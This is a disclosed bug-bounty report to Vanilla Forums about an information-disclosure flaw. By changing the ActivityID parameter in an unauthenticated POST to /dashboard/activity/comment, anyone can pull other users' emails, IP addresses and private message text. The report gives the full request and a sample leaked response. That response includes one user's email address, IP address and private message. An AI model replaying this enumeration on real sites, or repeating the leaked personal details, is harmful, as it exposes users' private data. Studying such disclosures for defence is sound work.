@@ -1,0 +1,83 @@
+ReportLink:https://hackerone.com/reports/321249
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/1000
+ReportedTo:Vanilla(vanilla)
+BountyAmount:300.0
+Severity:high
+State:Closed
+DateOfDisclosure:16.06.2018 16:40:23
+
+Summary:
+
+**Summary:**
+An unauthorized (even unauthenticated) user is able to view some private information about forum users. this information includes: email address (even if the user not allows it), IP address of the user, data of some of the private messages between two users.
+**Description:**
+by brute forcing ActivityIDs in the forum (I know about the rate limit of the bruteforce but it was still possible to get so many private infos, though it took so much time! ) , information of that activity ( IP address, type of activity and some data) are sent back to the unauthorized user.
+## Steps to reproduce:
+
+1. sign in the forum and send a comment on your dashboard/activities . the request should look like this:
+
+POST /dashboard/activity/comment HTTP/1.1
+Host: 9thsecurity.vanillaforums.com
+User-Agent: 
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: 
+Content-Length: 132
+Cookie: 
+Connection: close
+
+TransientKey=LgFniB9ii5sAgDbG&hpt=&ActivityID=1021&Return=activity%2Fpost%2F127'&Body=anything&DeliveryType=VIEW&DeliveryMethod=JSON
+
+2.as you see there is a parameter called "ActivityID" , change the value and the relevant activity info will be sent to you in the response. for instance for the above ActivityID, part of response is like this:
+{
+    "Activity": {
+        "ActivityID": 1021,
+        "ActivityTypeID": 28,
+        "NotifyUserID": 78,
+        "ActivityUserID": 12,
+        "RegardingUserID": null,
+        "Photo": "https://us.v-cdn.net/5022309/uploads/userpics/870/nQ2FNQ1B5RDRG.jpg",
+        "HeadlineFormat": "{ActivityUserID,User} sent you a <a href=\"{Url,html}\">message</a>",
+        "Story": "Hello Emeketos, what is your handle name for RSI? Just need to know for updating ship catalog. ",
+        "Format": "Html",
+        "Route": "/messages/61#285",
+        "RecordType": "Conversation",
+        "RecordID": 61,
+        "InsertUserID": 12,
+        "DateInserted": "2014-10-04 06:05:35",
+        "InsertIPAddress": "209.131.62.115",
+        "DateUpdated": "2014-10-04 06:05:35",
+        "Notified": 2,
+        "Emailed": 2,
+        "Data": [],
+        "FullHeadline": "%1$s sent you a %8$s.",
+        "ProfileHeadline": "%1$s sent you a %8$s.",
+        "AllowComments": 0,
+        "ShowIcon": 0,
+        "RouteCode": "message",
+        "ActivityType": "ConversationMessage",
+        "ActivityName": "defaunt",
+        "ActivityEmail": "ceravix@aol.com",
+        "ActivityGender": "u",
+        "ActivityPhoto": "https://us.v-cdn.net/5022309/uploads/userpics/870/nQ2FNQ1B5RDRG.jpg",
+        "RegardingName": null,
+        "RegardingEmail": null,
+        "RegardingGender": null,
+        "RegardingPhoto": null,
+        "PhotoUrl": "http://9thsecurity.vanillaforums.com/messages/61#285",
+        "Url": "http://9thsecurity.vanillaforums.com/messages/61#285",
+        "Headline": "<a href=\"/profile/defaunt\">defaunt</a> sent you a <a href=\"http://9thsecurity.vanillaforums.com/messages/61#285\">message</a>"
+    },
+ this is message from a user called defaunt. as you see the email address, IP address , the gender and the context of her message is shown to us. however if you try to open the message url directly, you'll see the error saying you don't have permission to view this.
+
+## Anything else we should know?
+there is no need to be logged in to send this request and get the response. I logged out of my account and I could still get the result. session management problem also exist.
+also, I attached some of the responses I got.
+
+## Impact
+
+the leaked information is highly sensitive and threatens users privacy.
